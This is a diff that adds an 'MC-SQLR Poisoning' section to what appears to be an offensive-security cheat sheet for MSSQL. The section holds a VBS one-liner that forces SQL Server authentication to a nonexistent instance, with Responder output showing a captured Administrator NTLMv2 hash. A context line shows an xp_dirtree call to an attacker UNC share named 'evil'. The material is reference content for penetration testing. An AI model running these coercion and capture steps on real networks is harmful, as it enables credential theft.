@@ -419,6 +419,23 @@ EXEC master..xp_dirtree \"\\\\192.168.1.33\\\\evil\";
 
 ### MC-SQLR Poisoning
 
+*The SQL Server Resolution Protocol is a simple application-level protocol that is used for the transfer of requests and responses between clients and database server discovery services.*
+
+```vbs
+CreateObject("ADODB.Connection").Open "Provider=SQLNCLI11;Data Source=DOESNOTEXIST\INSTANCE;Integrated Security=SSPI;"
+```
+> we captured the hash of the **Administrator** with this VBA script.
+```python
+[+] Listening for events...
+[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
+[MSSQL-BROWSER] Sending poisoned browser response to 10.1.2.3
+[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
+[*] [LLMNR]  Poisoned answer sent to 10.1.2.3 for name doesnotexist
+[MSSQL] NTLMv2 Client   : 10.1.2.3
+[MSSQL] NTLMv2 Username : TEST\Administrator
+[MSSQL] NTLMv2 Hash     : Administrator::TEST:1122334455667788:(etc...)
+```
+
 ### DML, DDL and Logon Triggers
 
 
